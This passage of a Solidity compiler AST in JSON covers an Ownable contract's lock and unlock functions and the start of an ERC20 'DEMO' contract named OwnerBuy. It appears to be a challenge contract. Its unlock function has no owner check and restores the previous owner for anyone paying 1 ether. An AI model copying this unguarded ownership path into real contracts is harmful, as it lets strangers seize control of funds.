																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 125,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2242:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 124,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2234:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 126,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2234:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 122,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "2205:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 127,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2205:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 128,
												"nodeType": "EmitStatement",
												"src": "2200:45:0"
											}
										]
									},
									"documentation": null,
									"id": 130,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 110,
											"modifierName": {
												"argumentTypes": null,
												"id": 109,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 62,
												"src": "2115:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "2115:9:0"
										}
									],
									"name": "lock",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 108,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2105:2:0"
									},
									"returnParameters": {
										"id": 111,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2125:0:0"
									},
									"scope": 151,
									"src": "2092:161:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 149,
										"nodeType": "Block",
										"src": "2360:142:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 137,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 134,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1241,
																	"src": "2379:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 135,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2379:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 136,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2392:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															},
															"src": "2379:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 133,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "2371:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 138,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2371:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 139,
												"nodeType": "ExpressionStatement",
												"src": "2371:29:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 141,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 14,
															"src": "2437:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 142,
															"name": "_previousOwner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 16,
															"src": "2445:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 140,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "2416:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 143,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2416:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 144,
												"nodeType": "EmitStatement",
												"src": "2411:49:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 147,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 145,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "2471:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 146,
														"name": "_previousOwner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 16,
														"src": "2480:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2471:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 148,
												"nodeType": "ExpressionStatement",
												"src": "2471:23:0"
											}
										]
									},
									"documentation": null,
									"id": 150,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "unlock",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 131,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2340:2:0"
									},
									"returnParameters": {
										"id": 132,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2360:0:0"
									},
									"scope": 151,
									"src": "2325:177:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 588,
							"src": "259:2246:0"
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 152,
										"name": "Ownable",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 151,
										"src": "2530:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Ownable_$151",
											"typeString": "contract Ownable"
										}
									},
									"id": 153,
									"nodeType": "InheritanceSpecifier",
									"src": "2530:7:0"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 154,
										"name": "ERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 966,
										"src": "2539:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_ERC20_$966",
											"typeString": "contract ERC20"
										}
									},
									"id": 155,
									"nodeType": "InheritanceSpecifier",
									"src": "2539:5:0"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 156,
										"name": "ERC20Detailed",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1024,
										"src": "2546:13:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_ERC20Detailed_$1024",
											"typeString": "contract ERC20Detailed"
										}
									},
									"id": 157,
									"nodeType": "InheritanceSpecifier",
									"src": "2546:13:0"
								}
							],
							"contractDependencies": [
								151,
								966,
								1024,
								1093
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 544,
							"linearizedBaseContracts": [
								544,
								1024,
								966,
								1093,
								151
							],
							"name": "OwnerBuy",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 161,
									"name": "status",
									"nodeType": "VariableDeclaration",
									"scope": 544,
									"src": "2567:38:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
										"typeString": "mapping(address => bool)"
									},
									"typeName": {
										"id": 160,
										"keyType": {
											"id": 158,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "2575:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "2567:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
											"typeString": "mapping(address => bool)"
										},
										"valueType": {
											"id": 159,
											"name": "bool",
											"nodeType": "ElementaryTypeName",
											"src": "2586:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_bool",
												"typeString": "bool"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 165,
									"name": "Times",
									"nodeType": "VariableDeclaration",
									"scope": 544,
									"src": "2612:40:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 164,
										"keyType": {
											"id": 162,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "2620:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "2612:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 163,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "2631:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 169,
									"name": "whiteList",
									"nodeType": "VariableDeclaration",
									"scope": 544,
									"src": "2659:43:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
										"typeString": "mapping(address => bool)"
									},
									"typeName": {
										"id": 168,
										"keyType": {
											"id": 166,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "2667:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "2659:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
											"typeString": "mapping(address => bool)"
										},
										"valueType": {
											"id": 167,
											"name": "bool",
											"nodeType": "ElementaryTypeName",
											"src": "2678:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_bool",
												"typeString": "bool"
											}
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 172,
									"name": "MAXHOLD",
									"nodeType": "VariableDeclaration",
									"scope": 544,
									"src": "2709:21:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 170,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "2709:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "313030",
										"id": 171,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "2727:3:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_100_by_1",
											"typeString": "int_const 100"
										},
										"value": "100"
									},
									"visibility": "internal"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 176,
									"name": "finished",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 175,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 174,
												"indexed": false,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 176,
												"src": "2752:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 173,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2752:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2751:6:0"
									},
									"src": "2737:21:0"
								},
								{
									"body": {
										"id": 184,
										"nodeType": "Block",
										"src": "2821:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 185,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [
										{
											"arguments": [
												{
													"argumentTypes": null,
													"hexValue": "44454d4f",
													"id": 179,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2801:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_44bdb2e6b4da239bb3168a28c10fd8f7e1c306661f791896d263493bb701dd61",
														"typeString": "literal_string \"DEMO\""
													},
													"value": "DEMO"
												},
												{
													"argumentTypes": null,
													"hexValue": "44454d4f",
													"id": 180,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2809:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_44bdb2e6b4da239bb3168a28c10fd8f7e1c306661f791896d263493bb701dd61",
														"typeString": "literal_string \"DEMO\""
													},
													"value": "DEMO"
												},
												{
													"argumentTypes": null,
													"hexValue": "3138",
													"id": 181,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2817:2:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_18_by_1",
														"typeString": "int_const 18"
													},
													"value": "18"
												}
											],
											"id": 182,
											"modifierName": {
												"argumentTypes": null,
												"id": 178,
												"name": "ERC20Detailed",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1024,
												"src": "2787:13:0",
												"typeDescriptions": {
													"typeIdentifier": "t_type$_t_contract$_ERC20Detailed_$1024_$",
													"typeString": "type(contract ERC20Detailed)"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "2787:33:0"
										}
									],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 177,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2777:2:0"
									},
									"returnParameters": {
										"id": 183,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2821:0:0"
									},
									"scope": 544,
									"src": "2766:57:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 196,
										"nodeType": "Block",
										"src": "2889:41:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 192,
														"name": "whiteList",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 169,
														"src": "2907:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
															"typeString": "mapping(address => bool)"
														}
													},
													"id": 194,
													"indexExpression": {
														"argumentTypes": null,
														"id": 193,
														"name": "addr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 187,
														"src": "2917:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "2907:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 191,
												"id": 195,
												"nodeType": "Return",
												"src": "2900:22:0"
											}
										]
									},
									"documentation": null,
									"id": 197,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "isWhite",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 188,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 187,
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"scope": 197,
												"src": "2848:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 186,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2848:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2847:14:0"
									},
									"returnParameters": {
										"id": 191,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 190,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 197,
												"src": "2883:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 189,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2883:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2882:6:0"
									},
									"scope": 544,
									"src": "2831:99:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 214,
										"nodeType": "Block",
										"src": "3004:63:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 210,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 206,
															"name": "whiteList",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 169,
															"src": "3015:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																"typeString": "mapping(address => bool)"
															}
														},
														"id": 208,
														"indexExpression": {
															"argumentTypes": null,
															"id": 207,
															"name": "addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 199,
															"src": "3025:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "3015:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "74727565",
														"id": 209,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3033:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "3015:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 211,
												"nodeType": "ExpressionStatement",
												"src": "3015:22:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 212,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3055:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 205,
												"id": 213,
												"nodeType": "Return",
												"src": "3048:11:0"
											}
										]
									},
									"documentation": null,
									"id": 215,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 202,
											"modifierName": {
												"argumentTypes": null,
												"id": 201,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 62,
												"src": "2979:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "2979:9:0"
										}
									],
									"name": "setWhite",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 200,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 199,
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"scope": 215,
												"src": "2956:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 198,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2956:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2955:14:0"
									},
									"returnParameters": {
										"id": 205,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 204,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 215,
												"src": "2998:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 203,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2998:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2997:6:0"
									},
									"scope": 544,
									"src": "2938:129:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": {
										"id": 232,
										"nodeType": "Block",
										"src": "3143:64:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 228,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 224,
															"name": "whiteList",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 169,
															"src": "3154:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																"typeString": "mapping(address => bool)"
															}
														},
														"id": 226,
														"indexExpression": {
															"argumentTypes": null,
															"id": 225,
															"name": "addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 217,
															"src": "3164:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "3154:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "66616c7365",
														"id": 227,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3172:5:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"src": "3154:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 229,
												"nodeType": "ExpressionStatement",
												"src": "3154:23:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 230,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3195:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 223,
												"id": 231,
												"nodeType": "Return",
												"src": "3188:11:0"
											}
										]
									},
									"documentation": null,
									"id": 233,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 220,
											"modifierName": {
												"argumentTypes": null,
												"id": 219,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 62,
												"src": "3118:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "3118:9:0"
										}
									],
									"name": "unsetWhite",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 218,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 217,
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"scope": 233,
												"src": "3095:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 216,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3095:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3094:14:0"
									},
									"returnParameters": {
										"id": 223,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 222,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 233,
												"src": "3137:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 221,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3137:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3136:6:0"
									},
									"scope": 544,
									"src": "3075:132:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": {
										"id": 285,
										"nodeType": "Block",
										"src": "3328:304:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 251,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 242,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "3339:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 244,
														"indexExpression": {
															"argumentTypes": null,
															"id": 243,
															"name": "sender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 235,
															"src": "3349:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "3339:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 249,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 239,
																"src": "3381:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 245,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
